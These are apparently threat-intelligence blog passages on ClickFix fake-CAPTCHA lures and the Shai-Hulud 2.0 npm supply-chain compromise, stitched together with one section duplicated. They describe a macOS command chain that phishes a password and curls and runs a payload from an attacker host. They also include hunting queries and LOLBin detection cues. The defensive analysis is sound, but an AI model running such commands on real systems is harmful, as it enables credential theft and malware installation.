scam pages (including the ClickFix landing page) through the malvertising redirectors. Drive-by compromise Some threat actors have also been observed to leverage compromised websites to deliver the ClickFix landing page. For example, the threat actor we track as Storm-0249 has traditionally used email to deliver Latrodectus or other initial access malware\u2014whether by using PDF files or URL links (sometimes copyright infringement -themed). However, since the beginning of March 2025, Storm-0249 switched to compromising legitimate websites, potentially through WordPress vulnerabilities, and using the ClickFix technique to deliver its payloads. When a user visits the compromised site, the original page is briefly displayed before it\u2019s replaced with the ClickFix human verification lure. This specific lure even spoofs Cloudflare to further trick users into thinking that the verification step is legitimate: Figure 13. ClickFix lure spoofing Cloudflare Turnstile on a compromised site Inside the click: ClickFix implementations ClickFix operators use several methods to attempt to convince a target to perform user-level command execution on their system. Early landing pages mimicked Google\u2019s \u201c Aw, Snap! \u201d crash error or Word Online extension missing message (as depicted in Figure 4), while recent ones spoof Google\u2019s reCAPTCHA and Cloudflare\u2019s Turnstile solution. We\u2019ve even observed threat actors spoof social media platforms like Discord to trick users into believing they\u2019re joining an actual Discord server. Many elements go into building ClickFix lure pages\u2014from JavaScript inline frames (iframes) and HTML href codes to cascading style sheets (CSS) resources\u2014to make them more legitimate-looking. There are various ways that ClickFix is implemented: some implementations are contained in one file or page, while others use remote resources. Some threat actors leave code comments amateurishly while others obfuscate their code. There are even implementations that report the status of an infection to a Telegram channel or a web server. We provide a few examples of these implementations and discuss their inner workings. Impersonating Cloudflare Turnstile Figure 14 shows a partial screenshot of a ClickFix landing page, binancepizza[.]info , displaying a seemingly legitimate Cloudflare Turnstile verification process that a user is lured to interact with before they can supposedly access the site: Figure 14. The ClickFix landing page binancepizza[.]info Its HTML source code clones this Cloudflare Turnstile style page using a href attribute to a CSS resource hosted by the Font Awesome library: Figure 15. HTML code highlighting a CSS resource for a Cloudflare verification prompt The page also references an HTML file ( field.html ) using a hidden iframe: Figure 16. HTML code highlighting hidden iframe and text needing to \u201cverify\u201d Within field.html , we see in Figure 17 that contentEl is the iframe element representing the fake Cloudflare Turnstile verification check box. When a user ticks the Verify you are human check box, this script animates a fake spinner through runVerification() and sends postMessage(\u201ctrigger\u201d) to the parent window (the main landing page). Figure 17. JavaScript code of iframe field.html, highlighting elements that send a trigger message upon verification click The user is then presented with the ClickFix instructions (Figure 18), while the obfuscated command is copied to the user\u2019s clipboard (Figure 19): Figure 18. ClickFix instructions from binancepizza[.]info Figure 19. Malicious command copied to clipboard Figure 20 shows that the clipboard copy occurs once the code receives the message \u201ctrigger\u201d, which is sent by the field.html hidden iframe. Once that message is received, the script uses navigator.clipboard.writeText(codeToCopy) to copy the command to the clipboard. Figure 20. JavaScript code highlighting the method navigator.clipboard.writeText, which copies a malicious command to clipboard Impersonating social platforms It\u2019s important to note that not all ClickFix landing pages are designed in the same manner and might not strictly contain the elements discussed previously. In some instances, threat actors also mimic popular social platforms to broaden their reach of potential targets. Figure 21 shows a ClickFix landing page spoofing a Discord server supposedly needing to verify a user before they can join: Figure 21. Fake Discord server landing page implementing ClickFix. In this page\u2019s source code (Figure 22), we can see it referencing the Discord logo image file to appear legitimate. Additionally, the addEventListener method waits for the Verify button to get clicked (through verifyBtn ) so navgiator.clipboard.writetext(command) can copy the malicious command to the user\u2019s clipboard. This JavaScript method is a Clipboard API that allows for accessing the operating system (OS) clipboard. Older pages might use document.execCommand() , which is now deprecated. The fake Discord landing page differs from the previous example because the reference of an external trigger (from the hidden iframe) isn\u2019t used here. Instead, the click then copy is all processed from the main window. Based on our analysis, this landing page also appears to be part of the OBSCURE#BAT campaign delivering r77 rootkit. Figure 22. HTML code highlighting use of Discord logo and JavaScript elements that copy a malicious command to clipboard upon clicking \u201cverify\u201d The \u201cfix\u201d: User-level code execution The ClickFix technique typically presents its \u201cfix\u201d by instructing users to run malicious commands or code in the Windows Run dialog box. We assess that the threat actors who use this technique are banking on the idea that most of their targets aren\u2019t familiar with this Windows OS component and what it\u2019s used for, unlike the more advanced users doing system administrator tasks. Early ClickFix lures instructed users to run commands manually and directly in Windows Terminal or Windows PowerShell. However, multiple line warnings might have deterred potential victims from running these commands, leading to the threat actors changing their tactics. Figure 23. Example of a multiple line warning in Windows Terminal Detecting Windows Run dialog misuse The Windows Run dialog ( Win + R ) is a trusted shell input user interface (UI) that\u2019s part of Windows Explorer ( explorer.exe ). Internally, it uses ShellExecute or CreateProcess APIs to resolve and launch commands. The input is limited to MAX_PATH , requiring a null-terminated string ( \\0 ) with a practical maximum of 259 characters. Additionally, as part of the Run dialog, Windows loads tiptsf.dll module in explorer.exe . This DLL file is related to the Text Services Framework (TSF), which provides input processor interface. Figure 24. The Windows Run dialog box Entering commands into the Run dialog leaves forensic traces\u2014most notably in the RunMRU (Most Recently Used) registry key. This key keeps a history of Run dialog executions and can be used to reconstruct user-initiated activity during investigations. Note that it doesn\u2019t create a registry entry if the process execution fails. Figure 25. RunMRU registry key entry with a malicious ClickFix command To determine if a ClickFix command execution is potentially occurring in the environment, one can check the RunMRU entries if they include signs pointing to LOLBins\u2014such as powershell , mshta , rundll32 , wscript , curl , and wget \u2014that can execute code and/or download payloads. PowerShell continues to be the most leveraged native binary, with cmdlets such as iwr ( Invoke-WebRequest ), irm ( Invoke-RestMethod ), and iex ( Invoke-Expression ) being very prolific. Additional suspicious elements to check in entries within the RunRMU registry key include the following: First-stage payloads are often hosted by direct IP addresses, content delivery network (CDN) domains, interesting top-level domains (for example, .live , . shop , .icu ), or code-sharing platforms such as pastes. First-stage payloads are often delivered and/or launched as specific file type such as .html , .hta , .txt , .zip , .msi , .bat , .ps1 , or .vbs The file type of the scripts might be renamed to media extensions (such as .png , .mp3 , .mp4 , .wav , and .jpg ) to hide their true intent. The file type might employ double file extension for evasion (for example, file.hta.mp4 ) URLs are often shortened using shorteners such as Bitly. A fake reCAPTCHA, CAPTCHA, or Turnstile confirmation is included, such as the following: \u2705 \u201cI am not a robot \u2013 reCAPTCHA Verification ID: XXXX\u201d # # I am not a robot: CAPTCHA Verification UID: XXXX\\ # \u201cHuman, not a robot: CAPTCHA: Verification ID: XXXX\u201d \u2714\ufe0f \u201cCloud identificator:XXXX\u201d Figure 26. Examples of generic ClickFix commands Obfuscation and execution techniques for defense evasion The command examples in the previous section aren\u2019t all encompassing, as we\u2019ve observed threat actors employing a growing number of obfuscation and execution techniques for defense evasion. These techniques include nested execution chains, proxy command abuse, encoding schemes such as Base64, use of string concatenation/fragmentation, and escaped characters, among others. Figure 27. Example of a ClickFix command that was using nested PowerShell, string obfuscation through concatenated ampersand (\u201c&\u201d) delimiters, and benign sounding phrase (for example, \u201cMicrosoft Defender Services Secure Access\u201d) Figure 28. Example of a ClickFix command that was using LOLBIN stacking (repeated cmd.exe) and obfuscation through escape characters (^) Figure 29. Example of a ClickFix command that was obfuscated using string splitting and concatenation, indexed character access through the $1 command string, and ampersand execution Beyond Windows: ClickFix targeting macOS users In June 2025, a ClickFix campaign was reported to be targeting macOS users to deliver Atomic macOS Stealer (AMOS). This new campaign is yet another mark in the continuously evolving threat landscape, as the ClickFix technique was previously observed to be more common in Windows-based attacks. The campaign, which according to our analysis goes back to late May 2025, redirected target users to Clickfix-themed delivery websites that were impersonating Spectrum, a US-based company that provides services for cable television, internet access, and unified communications: Figure 30. ClickFix landing page with a fake CAPTCHA Like any other ClickFix campaign, when the user clicks the Alternate verification button, the page displays instructions the user has to follow to \u201cfix\u201d their issue. Interestingly, the steps the lure displays even on macOS users are for Windows devices: Figure 31. ClickFix instructions presented to the target user Meanwhile, in the background, a malicious command is copied to the user\u2019s clipboard. The command that is copied is different for macOS and Windows devices. Windows: Figure 32. Screenshot of the ClickFix command copied on Windows devices macOS: Figure 33. Screenshot of the ClickFix command copied on macOS devices The command that\u2019s copied for macOS devices instructs the system to perform the following actions: Get current user: username=$(whoami) Prompt for the correct password: Continuously prompt System Password: until the user enters the correct password Validate password: Use dscl . -authonly to verify the password against macOS directory services Store password: Save the valid password to the /tmp/.pass file Download payload: curl -o /tmp/update hxxps[:]//applemacios[.]com/getrur/update Remove quarantine: Use the stolen password with sudo -S xattr -c to bypass macOS security Make an executable file: chmod +x /tmp/update Launch the malware: Run the downloaded file /tmp/update The file saved as update within the tmp directory belongs to the AMOS malware family. AMOS variants such as Poseidon and Odyssey are known to steal user information, including browser cookies, passwords, and cryptocurrency wallet credentials. Behind the click: ClickFix kits and other services for sale Microsoft Threat Intelligence has observed several threat actors selling the ClickFix builders (also called \u201cWin + R\u201d) on popular hacker forums since late 2024. Some of these actors are bundling ClickFix builders into their existing kits that already generate various files such as LNK, JavaScript, and SVG files. The kits offer creation of landing pages with a variety of available lures including Cloudflare. They also offer construction of malicious commands that users will paste into the Windows Run dialog. These kits claim to guarantee antivirus and web protection bypass (some even promise that they can bypass Microsoft Defender SmartScreen ), as well as payload persistence. The cost of subscription to such a service might be between US$200 to US$1,500 per month. We\u2019ve also discovered sellers that offer one-time and piece-meal solutions (for example, only the source code, landing page, or the command line) priced anywhere between US$200 and US$500. Figures 34 and 35 show an example of a ClickFix builder that offers a variety of configurable options such as: Displaying a decoy PDF file after a target user is phished Payload execution timing Virtual machine (VM) detection and evasion (\u201cAnti VM\u201d) and user access control (UAC) bypass Visual template to be used, such as Google Meet, Google CAPTCHA, or Cloudflare Language to be used, for example, English, German, Spanish, French, Italian, or Portuguese Figure 34. Screenshot of a ClickFix builder, taken from the seller\u2019s demo video Figure 35. Another screenshot of a ClickFix builder, taken from the seller\u2019s demo video ClickFix protection and detection Microsoft Defender XDR offers comprehensive coverage for ClickFix attacks by leveraging a range of available technologies across different attack layers. For example, Microsoft Defender SmartScreen displays a warning to Microsoft Edge users when they visit a ClickFix landing page: Figure 36. Microsoft Defender SmartScreen flagging a ClickFix landing page Even if a user chooses to bypass the SmartScreen warning or is using a different web browser and is socially engineered to execute a command in the Run dialog, Microsoft Defender for Endpoint detects and mitigates the attacks initial access activities like the suspicious process execution and command-line activity during the process scan phase. Most attack paths eventually lead to the execution of either PowerShell or HTA scripts. Microsoft\u2019s Antimalware Scan Interface (AMSI) provides scanning capabilities for both scripting environments and PowerShell applications. Defender\u2019s Cloud Protection delivers enhanced protection by monitoring and intercepting outgoing connections to malicious URLs as well as analyzing process execution patterns. Additionally, Microsoft Defender for Office 365 analyzes end-to-end links and HTML attachments, and has fake CAPTCHA behavioral signatures that proactively block ClickFix-related phishing emails. Additional attack chain coverage with network protection In early 2025, Microsoft Defender Experts observed thousands of devices being affected by a ClickFix attack (that is, the ClickFix command was executed by a user on the device) per month, even with an endpoint detection and response (EDR) solution enabled. Due to this, our researchers performed pattern-of-life analysis to follow the tactics, techniques, and procedures (TTPs) in the attack timeline and understand the gaps that can be filled so that the attack could be stopped at the initial access stage. Their research resulted in the automation of the analysis and collection of numerous obfuscated/encoded LOLBin commands observed in the RunMRU registry, and they were able to successfully extract and block newly created malicious domainsthrough Defender for Endpoint\u2019s network protection feature . This feature is an important component on the protection against ClickFix because blocking the C2 domains early in the attack chain prevents the download and/or execution of first-stage payloads, effectively making the attack unsuccessful. Recommendations Microsoft Threat Intelligence recommends the following mitigations to reduce the impact of this threat. Educate users to identify social engineering attacks. Ensure users are aware of what they copy and paste. Check your Microsoft 365 email filtering settings to ensure spoofed emails, spam, and emails with malware are blocked. Use Microsoft Defender for Office 365 for enhanced phishing protection and coverage against new threats and polymorphic variants. Configure Defender for Office 365 to recheck links on click and delete sent mail in response to newly acquired threat intelligence. Turn on safe attachments policies to check attachments to inbound email. Consider using enterprise-managed browsers , which provide multiple security features including security update requirements and data compliance policies . Block web pages from automatically running Flash plugins. Enable network protection and web protection in Microsoft Defender for Endpoint to safeguard against malicious sites and internet-based threats. Encourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen , which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware. Turn on cloud-delivered protection in Microsoft Defender Antivirus, or the equivalent for your antivirus product, to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants. Enable PowerShell script block logging to detect and analyze obfuscated or encoded commands, providing visibility into malicious script execution that might otherwise evade traditional logging. Use PowerShell execution policies such as setting AllSigned or RemoteSigned tohelp reduce the risk of malicious execution by ensuring only trusted, signed scripts are executed, adding a layer of control. Use Group Policy to deploy hardening configurations throughout your environment, if certain features are not necessary: Disable the Run dialog box ( Win + R ) key and remove the Run option from the Start Menu by selecting User Configuration > Administrative Templates > Start Menu and Taskbar > Remove Run menu from Start Menu . Create an App Control policy that prohibits the launch of native Windows binaries from Run . This can be accomplished by defining a rule based on the specific process that is launching binaries like PowerShell. Configure Windows Terminal access and settings to warn users when the text they\u2019re pasting contains multiple lines . Microsoft Defender XDR customers can also implement the following attack surface reduction rules to harden an environment against PowerShell techniques used by threat actors: Block execution of potentially obfuscated scripts Block executable files from running unless they meet a prevalence, age, or trusted list criterion Block JavaScript or VBScript from launching downloaded executable content Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.

Content types Research Products and services Microsoft Defender Microsoft Defender Experts for XDR Microsoft Defender for Cloud Microsoft Defender for Endpoint Topics Cloud security Endpoint security Threat intelligence The Shai\u2011Hulud 2.0 supply chain attack represents one of the most significant cloud-native ecosystem compromises observed recently. Attackers maliciously modified hundreds of publicly available packages, targeting developer environments, continuous integration and continuous delivery (CI/CD) pipelines, and cloud-connected workloads to harvest credentials and configuration secrets. The Shai\u2011Hulud 2.0 campaign builds on earlier supply chain compromises but introduces more automation, faster propagation, and a broader target set: Malicious code executes during the preinstall phase of infected npm packages, allowing execution before tests or security checks. Attackers have compromised maintainer accounts from widely used projects (for example, Zapier, PostHog, Postman). Stolen credentials are exfiltrated to public attacker-controlled repositories, which could lead to further compromise. This campaign illustrates the risks inherent to modern supply chains: Traditional network defenses are insufficient against attacks embedded in trusted package workflows. Compromised credentials enable attackers to escalate privileges and move laterally across cloud workloads. In defending against threats like Shai-Hulud 2.0, organizations benefit significantly from the layered protection from Microsoft Defender, which provides security coverage from code, to posture management, to runtime. This defense-in-depth approach is especially valuable when facing supply chain-driven attacks that might introduce malicious dependencies that evade traditional vulnerability assessment tools. In these scenarios, the ability to correlate telemetry across data planes, such as endpoint or container behavior and runtime anomalies, becomes essential. Leveraging these insights enables security teams to rapidly identify compromised devices, flag suspicious packages, and contain the threat before it propagates further. This blog provides a high-level overview of Shai\u2011Hulud 2.0, the attack mechanisms, potential attack propagation paths, customized hunting queries, and the actions Microsoft Defender is taking to enhance detection, attack-path analysis, credential scanning, and supply chain hardening. Analyzing the Shai-Hulud 2.0 attack Multiple npm packages were compromised when threat actors added a preinstall script named set_bun.js in the package.json of the affected packages. The setup_bun.js script scoped the environment for an existing Bun runtime binary; if not found, the script installed it. Bun can be used in the same way Node.js is used. The Bun runtime executed the bundled malicious script bun_environment.js . This script downloaded and installed a GitHub Actions Runner archive. It then configured a new GitHub repository and a runner agent called SHA1Hulud . Additional files were extracted from the archive including, TruffleHog and Runner.Listener executables. TruffleHog was used to query the system for stored credentials and retrieve stored cloud credentials. Figure 1. Shai-Hulud 2.0 attack chain Microsoft Defender for Containers promptly notified our customers when the campaign began through the alert Suspicious usage of the shred command on hidden files detected . This alert identified the data destruction activity carried out as part of the campaign. Additionally, we introduced a dedicated alert to identify this campaign as Sha1-Hulud Campaign Detected \u2013 Possible command injection to exfiltrate credentials. In some cases, commits to the newly created repositories were under the name \u201cLinus Torvalds\u201d, the creator of the Linux kernel and the original author of Git. The use of fake personas highlights the importance of commit signature verification , which adds a simple and reliable check to confirm who actually created a commit and reduces the chance of impersonation. Figure 2. Malicious commit authored by user impersonating Linus Torvalds Mitigation and protection guidance Microsoft Defender recommends the following guidance for customers to improve their environments\u2019 security posture against Shai-Hulud: Review the Key Vault assets on the critical asset management page and investigate any relevant logs for unauthorized access. Rapidly rotate and revoke exposed credentials. Isolate affected CI/CD agents or workspaces. Prioritize high-risk attack paths to reduce further exposure. Remove unnecessary roles and permissions granted to identities assigned to CI/CD pipelines; specifically review access to key vaults. For Defender for Cloud customers, read on the following recommendation: As previously indicated, the attack was initiated during the preinstall phase of compromised npm packages. Consequently, cloud compute workloads that rely on these affected packages present a lower risk compared to those involved in the build phase. Nevertheless, it is advisable to refrain from using such packages within cloud workloads. Defender for Cloud conducts thorough scans of workloads and prompts users to upgrade or replace any compromised packages if vulnerable versions are detected. Additionally, it references the code repository from which the image was generated to facilitate effective investigation. To receive code repository mapping, make sure to connect your DevOps environments to Defender for Cloud. Refer to the following documentation for guidance on: Connecting Azure DevOps to Defender for Cloud Connecting GitHub environment to Defender for Cloud Connecting GitLab environment to Defender for Cloud Deploying Defender CLI for container image scan Figure 3. Defender for Cloud Recommendations page For npm maintainers: Use npm trusted publishing instead of tokens. Strengthen publishing settings on accounts, organizations, and packages to require two-factor authentication (2FA) for any writes and publishing actions. When configuring two-factor authentication , use WebAuthn instead of a time-based, one-time password (TOTP). To combat this evolving threat, we are also introducing a new functionality in Microsoft Defender for Cloud that identifies Shai-Hulud 2.0 packages by leveraging agentless code scanning . This capability works by creating a Software Bill of Materials (SBOM) in the background and performing a lookup to identify if any package in the filesystem or source code repository is a malicious package that could be a component of the Shai-Hulud attack. By decoupling security analysis from runtime execution, this approach ensures that deep dependency threats are detected without impacting the performance of workloads or pipelines. If malicious packages are found, recommendations in Microsoft Defender for Cloud provide immediate visibility into compromised assets as shown below. This ensures that security teams can act quickly to freeze dependencies and rotate credentials before further propagation occurs. The next recommended step for customers is to start scanning repositories and protecting supply chains. Learn how to set up connectors . Figure 4. Recommendations resulting from agentless code scanning Turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. Turn on attack surface reduction rules , particularly on blocking executable files from running unless they meet a prevalence, age or trusted list criterion and blocking execution of potentially obfuscated scripts . For more information on GitHub\u2019s plans on securing the npm supply chain and what npm maintainers can take today, Defender also recommends checking the Github plan for a more secure npm supply chain . Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.

Threat intelligence reports Microsoft Defender XDR customers can use the following threat analytics reports in the Defender portal (requires license for at least one Defender XDR product) to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog. These reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, or respond to associated threats found in customer environments. Microsoft Defender XDR threat analytics: Activity Profile: From vulnerable workflows to self-replicating malware: Technical analysis of npm supply chain security incidents Microsoft Security Copilot customers can also use the Microsoft Security Copilot integration in Microsoft Defender Threat Intelligence, either in the Security Copilot standalone portal or in the embedded experience in the Microsoft Defender portal to get more information about this threat actor. Attack path analysis Attack path analysis shows paths from exposed entry points to targets. Security teams can use attack path analysis to surface cross-domain exposure risks, for example how an attacker could move from externally reachable resources to sensitive systems to escalate privileges and maintain persistence. While supply chain attacks like those used by Shai-Hulud 2.0 can originate without direct exposure, customers can leverage advanced hunting to query the Exposure Graph for these broader relationships. For example, once a virtual or physical machine is determined to be compromised, key vaults that are directly accessible using credentials obtained from the compromised system can also be identified. The relevant access paths can be extracted using queries, as detailed in the hunting section below. Any key vault found along these paths should be investigated according to the mitigation guide. Hunting queries Microsoft Defender XDR Microsoft Defender XDR customers can run the following queries to find related activity in their networks: Attempts of malicious JS execution through node DeviceProcessEvents | where FileName has \"node\" and ProcessCommandLine has_any (\"setup_bun.js\", \"bun_environment.js\") Suspicious process launched by malicious JavaScript DeviceProcessEvents | where InitiatingProcessFileName in~ (\"node\", \"node.exe\") and InitiatingProcessCommandLine endswith \".js\" | where (FileName in~ (\"bun\", \"bun.exe\") and ProcessCommandLine has \".js\") or (FileName in~ (\"cmd.exe\") and ProcessCommandLine has_any (\"where bun\", \"irm \", \"[Environment]::GetEnvironmentVariable('PATH'\", \"|iex\")) or (ProcessCommandLine in~ (\"sh\", \"dash\", \"bash\") and ProcessCommandLine has_any (\"which bun\", \".bashrc && echo $PATH\", \"https://bun.sh/install\")) | where ProcessCommandLine !contains \"bun\" and ProcessCommandLine !contains \"\\\\\" and ProcessCommandLine !contains \"--\" GitHub exfiltration DeviceProcessEvents | where FileName has_any (\"bash\",\"Runner.Listener\",\"cmd.exe\") | where ProcessCommandLine has 'SHA1HULUD' and not (ProcessCommandLine has_any('malicious','grep','egrep',\"checknpm\",\"sha1hulud-checker-ado\",\"sha1hulud-checker-ado\",\" sha1hulud-checker-github\",\"sha1hulud-checker\",\"sha1hulud-scanner\",\"go-detector\",\"SHA1HULUD_IMMEDIATE_ACTIONS.md\",\"SHA1HULUD_COMPREHENSIVE_REPORT.md\",\"reddit.com\",\"sha1hulud-scan.sh\")) Paths from compromised machines and repositories to cloud key management services let T_src2Key = ExposureGraphEdges | where EdgeLabel == 'contains' | where SourceNodeCategories has_any ('code_repository', 'virtual_machine' , 'physical_device') | where TargetNodeCategories has 'secret' | project SourceNodeId, SourceNodeLabel, SourceNodeName, keyNodeId=TargetNodeId, keyNodeLabel=TargetNodeLabel; let T_key2identity = ExposureGraphEdges | where EdgeLabel == 'can authenticate as' | where SourceNodeCategories has 'key' | where TargetNodeCategories has 'identity' | project keyNodeId=SourceNodeId, identityNodeId=TargetNodeId; ExposureGraphEdges | where EdgeLabel == 'has permissions to' | where SourceNodeCategories has 'identity' | where TargetNodeCategories has \"keys_management_service\" | join hint.strategy=shuffle kind=inner (T_key2identity) on $left.SourceNodeId==$right.identityNodeId | join hint.strategy=shuffle kind=inner (T_src2Key) on keyNodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, srcEntityId=EntityIds) on $left.SourceNodeId1==$right.NodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, identityEntityId=EntityIds) on $left.identityNodeId==$right.NodeId | join hint.strategy=shuffle kind=inner (ExposureGraphNodes | project NodeId, kmsEntityId=EntityIds) on $left.TargetNodeId==$right.NodeId | project srcLabel=SourceNodeLabel1, srcName=SourceNodeName1, srcEntityId, keyNodeLabel, identityLabel=SourceNodeLabel, identityName=SourceNodeName, identityEntityId, kmsLabel=TargetNodeLabel, kmsName=TargetNodeName, kmsEntityId | extend Path = strcat('srcLabel',' contains','keyNodeLabel',' can authenticate as', ' identityLabel', ' has permissions to', ' kmsLabel') Setup of the GitHub runner with the malicious repository and downloads of the malicious bun.sh script that facilitates this CloudProcessEvents | where (ProcessCommandLine has \"--name SHA1HULUD\" ) or (ParentProcessName == \"node\" and (ProcessName == \"bash\" or ProcessName == \"dash\" or ProcessName == \"sh\") and ProcessCommandLine has \"curl -fsSL https://bun.sh/install | bash\") | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Credential collection using TruffleHog and Azure CLI CloudProcessEvents | where (ParentProcessName == \"bun\" and ProcessName in (\"bash\",\"dash\",\"sh\") and ProcessCommandLine has_any(\"az account get-access-token\",\"azd auth token\")) or (ParentProcessName == \"bun\" and ProcessName == \"tar\" and ProcessCommandLine has_any (\"trufflehog\",\"truffler-cache\")) | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName Cloud security explorer Microsoft Defender for Cloud customers can also use cloud security explorer to surface possibly compromised software packages. The following screenshot represents a query that searches for a virtual machine or repository allowing lateral movement to a key vault. View the query builder . Figure 5. Cloud security explorer query The security explorer templates library has been expanded with two additional queries that retrieve all container images with compromised software packages and all the running containers with these images. Another means for security teams to proactively identify the scope of this threat is by leveraging the Cloud Security Explorer to query the granular Software Bill of Materials (SBOM) generated by agentless scanners. This capability allows you to execute dynamic, graph-based queries across your entire multi-cloud estate\u2014including virtual machines, containers, and code repositories\u2014to pinpoint specific software components and their versions without the need for agent deployment. For the Shai-Hulud 2.0 campaign, you can use the Cloud Security Explorer to map your software inventory directly to the list of known malicious packages. By running targeted queries that search for the specific compromised package names identified in our threat intelligence, you can instantly visualize the blast radius of the attack within your environment. This enables you to locate every asset containing a malicious dependency and prioritize remediation efforts effectively. Figure 6. Cloud Security Explorer query Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with \u2018TI map\u2019) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.

Leveraging these insights enables security teams to rapidly identify compromised devices, flag suspicious packages, and contain the threat before it propagates further. This blog provides a high-level overview of Shai\u2011Hulud 2.0, the attack mechanisms, potential attack propagation paths, customized hunting queries, and the actions Microsoft Defender is taking to enhance detection, attack-path analysis, credential scanning, and supply chain hardening. Analyzing the Shai-Hulud 2.0 attack Multiple npm packages were compromised when threat actors added a preinstall script named set_bun.js in the package.json of the affected packages. The setup_bun.js script scoped the environment for an existing Bun runtime binary; if not found, the script installed it. Bun can be used in the same way Node.js is used. The Bun runtime executed the bundled malicious script bun_environment.js . This script downloaded and installed a GitHub Actions Runner archive. It then configured a new GitHub repository and a runner agent called SHA1Hulud . Additional files were extracted from the archive including, TruffleHog and Runner.Listener executables. TruffleHog was used to query the system for stored credentials and retrieve stored cloud credentials. Figure 1. Shai-Hulud 2.0 attack chain Microsoft Defender for Containers promptly notified our customers when the campaign began through the alert Suspicious usage of the shred command on hidden files detected . This alert identified the data destruction activity carried out as part of the campaign. Additionally, we introduced a dedicated alert to identify this campaign as Sha1-Hulud Campaign Detected \u2013 Possible command injection to exfiltrate credentials. In some cases, commits to the newly created repositories were under the name \u201cLinus Torvalds\u201d, the creator of the Linux kernel and the original author of Git. The use of fake personas highlights the importance of commit signature verification , which adds a simple and reliable check to confirm who actually created a commit and reduces the chance of impersonation. Figure 2. Malicious commit authored by user impersonating Linus Torvalds Mitigation and protection guidance Microsoft Defender recommends the following guidance for customers to improve their environments\u2019 security posture against Shai-Hulud: Review the Key Vault assets on the critical asset management page and investigate any relevant logs for unauthorized access. Rapidly rotate and revoke exposed credentials. Isolate affected CI/CD agents or workspaces. Prioritize high-risk attack paths to reduce further exposure. Remove unnecessary roles and permissions granted to identities assigned to CI/CD pipelines; specifically review access to key vaults. For Defender for Cloud customers, read on the following recommendation: As previously indicated, the attack was initiated during the preinstall phase of compromised npm packages. Consequently, cloud compute workloads that rely on these affected packages present a lower risk compared to those involved in the build phase. Nevertheless, it is advisable to refrain from using such packages within cloud workloads. Defender for Cloud conducts thorough scans of workloads and prompts users to upgrade or replace any compromised packages if vulnerable versions are detected. Additionally, it references the code repository from which the image was generated to facilitate effective investigation. To receive code repository mapping, make sure to connect your DevOps environments to Defender for Cloud. Refer to the following documentation for guidance on: Connecting Azure DevOps to Defender for Cloud Connecting GitHub environment to Defender for Cloud Connecting GitLab environment to Defender for Cloud Deploying Defender CLI for container image scan Figure 3. Defender for Cloud Recommendations page For npm maintainers: Use npm trusted publishing instead of tokens. Strengthen publishing settings on accounts, organizations, and packages to require two-factor authentication (2FA) for any writes and publishing actions. When configuring two-factor authentication , use WebAuthn instead of a time-based, one-time password (TOTP). To combat this evolving threat, we are also introducing a new functionality in Microsoft Defender for Cloud that identifies Shai-Hulud 2.0 packages by leveraging agentless code scanning . This capability works by creating a Software Bill of Materials (SBOM) in the background and performing a lookup to identify if any package in the filesystem or source code repository is a malicious package that could be a component of the Shai-Hulud attack. By decoupling security analysis from runtime execution, this approach ensures that deep dependency threats are detected without impacting the performance of workloads or pipelines. If malicious packages are found, recommendations in Microsoft Defender for Cloud provide immediate visibility into compromised assets as shown below. This ensures that security teams can act quickly to freeze dependencies and rotate credentials before further propagation occurs. The next recommended step for customers is to start scanning repositories and protecting supply chains. Learn how to set up connectors . Figure 4. Recommendations resulting from agentless code scanning Turn on cloud-delivered protection and automatic sample submission on Microsoft Defender Antivirus. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. Turn on attack surface reduction rules , particularly on blocking executable files from running unless they meet a prevalence, age or trusted list criterion and blocking execution of potentially obfuscated scripts . For more information on GitHub\u2019s plans on securing the npm supply chain and what npm maintainers can take today, Defender also recommends checking the Github plan for a more secure npm supply chain . Microsoft Defender XDR detections Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog. Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.

